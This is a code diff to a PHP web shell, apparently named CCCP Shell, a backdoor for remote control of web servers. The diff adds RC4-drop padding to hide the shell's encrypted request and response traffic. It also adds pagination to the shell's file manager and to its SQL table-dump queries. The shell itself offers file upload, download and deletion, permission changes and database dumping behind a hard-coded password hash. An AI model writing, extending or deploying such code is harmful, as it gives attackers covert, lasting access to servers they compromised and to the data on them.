@@ -12,10 +12,11 @@ $config['date'] = 'd/m/Y';
 $config['datetime'] = 'd/m/Y H:i:s';
 $config['hd_lines'] = 16;   //lines in hex preview file
 $config['hd_rows'] = 32;    //16, 24 or 32 bytes in one line
-$config['FMLimit'] = False; //file manager item limit. False = No limit //TODO
-$config['checkBDel'] = true;//Check Before Delete: True = On 
+$config['FMLimit'] = 100;   //file manager item limit. false = No limit
+$config['checkBDel'] = true;//Check Before Delete: true = On 
 $config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
 $config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
+$config['rc4drop'] = 123;  //drop size
 
 $CCCPmod[] = 'sql';
 $CCCPtitle[] = tText('sql', 'SQL');
@@ -170,14 +171,26 @@ function rc4($data, $box) {
 	return $cipher;
 }
 
-function getCrypt(){
+function rc4encrypt($data, $box) {
+	global $config;
+	for ($i = 1; $i <= $config['rc4drop']; $i++)
+		$data = chr(mt_rand(33, 122)) . $data;
+	return rc4($data, rc4Init($box));
+}
+
+function rc4decrypt($data, $box) {
+	global $config;
+	return substr(rc4($data, rc4Init($box)), $config['rc4drop']);
+}
+
+function getData(){
 	global $config;
 	$p = '';
 	if (isset($_POST[$config['consNames']['post']])) $p = fix_magic_quote($_POST[$config['consNames']['post']]);
 	else if (isset($_GET[$config['consNames']['post']])) $p = fix_magic_quote($_GET[$config['consNames']['post']]);
 	if (!empty($p)){
 		$data = array();
-		$p = rc4(base64_decode($p), rc4Init($config['sPass']));
+		$p = rc4decrypt(base64_decode($p), $config['sPass']);
 		foreach(explode('&', $p) as $tmp) {
 			$tmp = explode('=', $tmp);
 			if (!empty($tmp[0])){
@@ -351,7 +364,7 @@ function getUpPath($nowpath){
 
 function sAjax($i){
 	global $config;
-	exit(base64_encode(rc4($i, rc4Init($config['sPass']))));
+	exit(base64_encode(rc4encrypt($i, $config['sPass'])));
 }
 
 function sDialog($i){
@@ -387,7 +400,7 @@ function zip($files, $archive){
 	$zip->close();
 }
 
-//TODO agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
+//TODO: agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
 //para poder usarlo con archivos enormes/poca memoria
 # Based on PHPZip v1.2 by DSR!
 class PHPZip {
@@ -629,9 +642,32 @@ function filesize64($file){
 	return $size;
 }
 
+function genPaginator($c, $t = -1, $fm = true) {
+	$l = 'ajaxLoad("me=sql&pg=';
+	if ($fm)
+		$l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
+	
+	if ($t < 0)
+		$t = $c + 1;
+	
+	$tmp = '<div class="paginator">';
+	$i = 0;
+	while($i < $t) {
+		$i++;
+		if ($i < $c)
+			$tmp .= mLink($i, $l . $i . '")', 'class="prev"');
+		else if ($i == $c)
+			$tmp .= '<span class="current">' . $i . '</span>';
+		else
+			$tmp .= mLink($i . ($fm ? ' ...?' : ''), $l . $i . '")', 'class="next"');
+	}
+
+	return $tmp . '</div>';
+}
+
 
 $sBuff = '';  	
-$p = getCrypt();
+$p = getData();
 
 
 # Sections
@@ -752,14 +788,14 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		return q.join("&");
 	}
 	
-	function getCrypt(d, t){
+	function getData(d, t){
 		b = rc4Init(hash);
 		if (t === "e")
-			$r = euc(btoa(rc4(d, b)));
+			r = euc(btoa(rc4(randStr(' . $config['rc4drop'] . ') + d, b)));
 		else
-			$r = rc4(atob(d), b);
+			r = rc4(atob(d), b).substr(' . $config['rc4drop'] . ');
 		
-		return $r;
+		return r;
 	}
 	
 	function ajax(p, cf){
@@ -773,7 +809,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			};
 		};
 		ao.stateChange = function (object){
-			if (ao.request.readyState == 4) ao.cf(getCrypt(ao.request.responseText, "d"));
+			if (ao.request.readyState == 4) ao.cf(getData(ao.request.responseText, "d"));
 		};
 		if (window.XMLHttpRequest){
 			req = ao.request;
@@ -782,7 +818,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
 			req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 			req.setRequestHeader("Connection", "close");
-			req.send("' . $config['consNames']['post'] . '=" + getCrypt(p, "e"));
+			req.send("' . $config['consNames']['post'] . '=" + getData(p, "e"));
 		}
 		return ao;
 	}
@@ -870,12 +906,12 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		ajax(p, function(r){
 			empty("content");
 			append("content", r);
-			updateui();
+			updateUI();
 			lastLoad = p;
 		});
 	}
 	
-	function updateui(){
+	function updateUI(){
 		o = d.getElementById("jseval");
 		if (o) eval(o.value);
 		o = d.getElementById("sort");
@@ -966,7 +1002,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		' : '') . '
         if (a === "comp"){
             hide_box();
-            append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getCrypt("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
+            append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getData("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
         } else {
             if (a !== "rdel" && n === "") return;
             if (a !== "copy" && a !== "rdel") o = euc(o);
@@ -986,11 +1022,11 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	
 	function dl(o){
 		remove("dlf");
-		append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getCrypt("me=file&md=tools&ac=dl&fl=" + euc(dpath(o, true)), "e") + "\'></iframe>");
+		append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getData("me=file&md=tools&ac=dl&fl=" + euc(dpath(o, true)), "e") + "\'></iframe>");
 	}
 	
 	function up(){
-		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'><input type=\'hidden\' value=\'" + decodeURIComponent(getCrypt("me=file&ac=up&dir=" + euc(d.getElementById("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'><table class=\'boxtbl\'><tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr></table></form>";
+		ct = "<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\'' . getSelf() . '\'><input type=\'hidden\' value=\'" + decodeURIComponent(getData("me=file&ac=up&dir=" + euc(d.getElementById("base").value), "e")) + "\' name=\'' . $config['consNames']['post'] . '\'><table class=\'boxtbl\'><tr><td class=\'colFit\'>' . tText('file', 'File') . '</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr><tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>' . tText('go', 'Go!') . '</span></td></tr></table></form>";
 		show_box("' . tText('upload', 'Upload') . '", ct);
 	}
 	
@@ -1010,7 +1046,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		ajax(serialize(d.forms[0]) + \'&sqlcode=\' + c, function(r){
 			empty("dbRes");
 			append("dbRes", r);
-			updateui();
+			updateUI();
 		});
 	}	
 	
@@ -1393,6 +1429,43 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		.txt{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAD1BMVEVMaXH///8AAADHx8eFhYXIFtsVAAAAAXRSTlMAQObYZgAAADVJREFUeAFjYGACAwYQUHQEAQUgi0UIAkBMQTAwQmcqKSopYRFVolQUwTQGAxCTQQkMgC4DAOb7DCz7id5MAAAAAElFTkSuQmCC") no-repeat;}
 		.unk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXGFptrR5PxfaHnx9/60zPMlTqR1iLk29K4nAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjYBAEAgEGIBBxcXERNIAxxMEM1yClcAMgwzUtLUkVxHBLD08DM8KSlCAMJyVFMENISaksFcwACgSFAhlFSmqJqhCGqmgoTASVUQiyvhzIYDYGAQMAJZwXv2puTlMAAAAASUVORK5CYII=") no-repeat;}
 		.xml{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH6+vqGhoYAAAAsap6Kyu8AAJYzmQAtPsCtAAAAAXRSTlMAQObYZgAAAE9JREFUeAFjUAIDBgYGRUEgEFWAMYSgDGFjAwZFUUEXR1FBICNMRDRMLNCAQTVRJLRMMBUsEp4GFAGpSUsEqxEEARBDxAUI8IogGMYQYAAA5l8SSFIGd4wAAAAASUVORK5CYII=") no-repeat;}
+	  
+
+		div.paginator {
+			text-align:center;
+			padding: 7px;
+			margin: 3px;
+		}
+		
+		div.paginator a {
+			padding: 2px 5px 2px 5px; 
+			margin: 2px;
+			border: 1px solid #000000;
+			text-decoration: none; # no underline 
+			color: #000000;
+		}
+		
+		div.paginator a:hover, div.paginator a:active {
+			border: 1px solid #000000;
+			background-color:#000;
+			color: #fff;
+		}
+
+		div.paginator span.current {
+			padding: 2px 5px 2px 5px;
+			margin: 2px; 
+			border: 1px solid #000000;
+			font-weight: bold;
+			background-color: #000000;
+			color: #FFF;
+		}
+		  
+		div.paginator span.disabled {
+			padding: 2px 5px 2px 5px;
+			margin: 2px;
+			border: 1px solid #EEE; 
+			color: #DDD; 
+		}
 	  </style>
 	</head>
 	<body>
@@ -2002,34 +2075,37 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		} else {
             if (is_dir($currentdir)){
 				if ($res = opendir($currentdir)){
-					$c = 0;
-					$start = False;
-					$show = True;
+					$c = $d = 0;
+					$show = true;
 					
-					if ($config['FMLimit'] && isset($p['pg'])){
-						$start = ($p['pg'] > 1 ? $config['FMLimit'] * ($p['pg'] - 1) : $config['FMLimit']);
+					if ($config['FMLimit']){
+						$show = false;
+						if (!isset($p['pg'])) $p['pg'] = 1; 
+						$start = $config['FMLimit'] * ($p['pg'] - 1);
 						$config['FMLimit'] = $config['FMLimit'] * $p['pg'];
 					}
 
 					while ($file = readdir($res)){
 						if ($config['FMLimit'])	{
-							if ($start) 
-								if ($c == $start) 
-									$start = True;
+							if ($c == $start) 
+								$show = true;
+								
 							if ($c == $config['FMLimit']) 
 								break;  
 						}
-						if ($show){
-							if (is_dir($currentdir . $file)){
-								if ($file !== '.' && $file !== '..'){
-									$c++;
-									$dirdata[] = $file;
-								}
-							} else if (is_file($currentdir . $file)){
+						
+						if (is_dir($currentdir . $file)){
+							if ($file !== '.' && $file !== '..'){
 								$c++;
+								$d++;
+								if ($show)
+									$dirdata[] = $file;
+							}
+						} else if (is_file($currentdir . $file)){
+							$c++;
+							if ($show)
 								$filedata[] = $file;
-							} //TODO syslinks
-						} 
+						} //TODO syslinks 
 					}
 					
 					closedir($res);
@@ -2051,7 +2127,6 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			</tr></thead>
 			<tbody>';
 					
-			$d = 0;
 			$bg = 2;
 			foreach ($dirdata as $file){
                 $sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
@@ -2068,12 +2143,8 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
 					</td>
 					</tr>';
-				$d++;
             }
 
-			//$_SERVER['DOCUMENT_ROOT']
-			//uso esa variable para saber si corresponde o no el link al archivo
-			
             foreach ($filedata as $file){
                 $sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td width="2%"><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';
@@ -2081,8 +2152,10 @@ if (isset($p['me']) && $p['me'] === 'file'){
                 //mark shell name in yellow
                 if ($currentdir . $file === __file__) $sBuff .= '<div class="image php"></div><font class="my">' . $file . '</font>';
                 else $sBuff .= showIcon($file) . ' <a href="' . str_replace(SROOT, '', $file) . '" target="_blank">' . $file . '</a>';
-
-                $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
+				//$_SERVER['DOCUMENT_ROOT']
+				//uso esa variable para saber si corresponde o no el link al archivo
+               
+			   $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
 							<td>' . sizecount(filesize64($currentdir . $file)) . '</td>
 							' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . 
 							'</td>' : '') . '
@@ -2094,7 +2167,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 							<div onclick="dl(this);return false;" class="image download"></div>
 							</td></tr>';
             }
-
+				
             $sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td width="2%">
 					<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />
@@ -2108,6 +2181,10 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					</td>
 					</tr></tfoot>
 					</table></form>' . mHide('base', $currentdir);
+					
+			
+			if ($config['FMLimit'])
+				$sBuff .= genPaginator($p['pg'], ($c < $config['FMLimit'] ? $p['pg'] : -1));
         }
 }
 
@@ -2387,14 +2464,16 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 							else $showtbl = 'SHOW TABLES FROM '.$rows; //mysql
 
 							$res_t = sql_query($p['sqltype'], $showtbl, $con);
-							if ($res_t!=false){
-								while($tablearr=sql_fetch_data($p['sqltype'], $res_t)){
+							if ($res_t != false){
+								$start = (isset($p['start']))? (int)$p['start'] : 0;
+								$limit = (isset($p['start']))? (int)$p['start'] : 100;
+								while($tablearr = sql_fetch_data($p['sqltype'], $res_t)){
 									foreach($tablearr as $tables){
-										if($p['sqltype']==='mssql') $dumptbl = 'SELECT TOP 100 * FROM '.$rows.'..'.$tables;
-										elseif($p['sqltype']==='pgsql') $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 100 OFFSET 0';
-										elseif($p['sqltype']==='oracle') $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' WHERE ROWNUM BETWEEN 0 AND 100;';
-										elseif($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $dumptbl = 'SELECT * FROM '.$tables.' LIMIT 0, 100';
-										else $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 0, 100'; //mysql
+										if ($p['sqltype']==='mssql') $dumptbl = "SELECT TOP 100 * FROM {$rows}..{$tables}"; //TODO
+										elseif ($p['sqltype']==='pgsql') $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {$limit} OFFSET {$start}";
+										elseif ($p['sqltype']==='oracle') $dumptbl = "SELECT * FROM {$rows}.{$tables} WHERE ROWNUM BETWEEN {$start} AND " . ($start + $limit) . ";";
+										elseif ($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $dumptbl = "SELECT * FROM {$tables} LIMIT {$start}, {$limit}";
+										else $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {$start}, {$limit}"; //mysql
 											
 										$sBuff .= '<tr><td><a href="#" onclick="dbexec(\'' . $dumptbl . '\');return false;">' . $tables . '</a></td></tr>';
 									}
@@ -2889,7 +2968,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		return box;
 	}
 
-	function rc4(data, box) { 	
+	function rc4(data, box) {
 		i = 0;
 		j = 0;
 		res = '';
@@ -2904,7 +2983,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		}
 		
 		return res;
-	}	
+	}
 	
 	//MD5 - DSR!
 	function add32(a, b) {
@@ -3046,10 +3125,18 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		for (i = 0; i < x.length; i++){
 			s = '';
 			for (j = 0; j < 4; j++)
-		s += hex_chr[(x[i] >> (j * 8 + 4)) & 0x0F] + hex_chr[(x[i] >> (j * 8)) & 0x0F];
+				s += hex_chr[(x[i] >> (j * 8 + 4)) & 0x0F] + hex_chr[(x[i] >> (j * 8)) & 0x0F];
 			x[i] = s;
 		}
 		return x.join('');
+	}
+	
+	function randStr(l) {
+		s = "";
+		while(s.length < l)
+			s += Math.random().toString(36).slice(2);
+			
+		return s.substr(0, l);
 	}
 <?php 
 	$loader = "var d = document;
@@ -3057,7 +3144,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	ajax.onreadystatechange = function() {
 		if (ajax.readyState == 4 && ajax.status == 200) {
 			hash = sessionStorage.getItem('{$config['consNames']['slogin']}');
-			d.getElementsByTagName('html')[0].innerHTML = rc4(atob(ajax.responseText), rc4Init(hash));
+			d.getElementsByTagName('html')[0].innerHTML = rc4(atob(ajax.responseText), rc4Init(hash)).substr({$config['rc4drop']});
 			
 			oldscript = d.getElementsByTagName('head')[0].getElementsByTagName('script')[0];			
 			fixscript = d.createElement('script');
@@ -3075,7 +3162,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		sessionStorage.setItem('{$config['consNames']['slogin']}', hash);
 	}
 	
-	post = '{$config['consNames']['post']}=' + encodeURIComponent(btoa(rc4('me=loader" . (isset($p['dir']) ? "&dir=" . rawurlencode($p['dir']) : "") . "', rc4Init(hash))));
+	post = '{$config['consNames']['post']}=' + encodeURIComponent(btoa(rc4(randStr({$config['rc4drop']}) + 'me=loader" . (isset($p['dir']) ? "&dir=" . rawurlencode($p['dir']) : "") . "', rc4Init(hash))));
 	ajax.open('POST', '" . getSelf() . "', true);
 	ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 	ajax.setRequestHeader('Content-Length', post.length);
